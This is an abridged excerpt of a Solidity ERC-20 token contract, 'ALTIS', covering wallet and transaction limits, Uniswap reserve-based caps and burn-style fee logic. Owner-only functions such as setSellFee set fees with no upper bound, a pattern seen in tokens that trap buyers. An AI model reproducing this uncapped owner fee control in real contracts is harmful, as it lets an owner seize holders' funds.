...
contract ALTIS is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "ALTIS";
    string private _symbol = "ALTIS";
    uint8 private _decimals = 9;

    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address payable public marketingAddress = payable(0xC322792fEBd542D001413Acc312725f988a7C581); // Marketing Address
    ...
    uint256 public _walletMax = 21000 * 10 ** _decimals;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    bool public checkWalletLimit = true;
    bool public takeFeeDisable = false;
    ...
    function setSellFee(uint8 sellFee) public onlyOwner {
        _sellFee = sellFee;
    }

    function setTransferFee(uint8 transferFee) public onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if (!isTxLimitExempt[sender] && !isTxLimitExempt[recipient] && !takeFeeDisable) {
            (uint reserve0, uint reserve1,)  = IUniswapV2Pair(uniswapPair).getReserves();
            if(address(this) == IUniswapV2Pair(uniswapPair).token0()){
                  _maxTxAmount = reserve0.mul(uint256(1000000000000000000)).div(reserve1);
            }
            if(address(this) == IUniswapV2Pair(uniswapPair).token1()){
                 _maxTxAmount = reserve1.mul(uint256(1000000000000000000)).div(reserve0);
            }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (isMarketPair[recipient]) {
            ...
            if(_totalSupply <= uint(210000000000)){
                takeFeeDisable = true;
            }else{
                feeAmount = amount.mul(_transferFee).div(100);
                feeAmount = _totalSupply.sub(feeAmount) <= uint(210000000000) ? _totalSupply.sub(uint(210000000000)) : feeAmount;
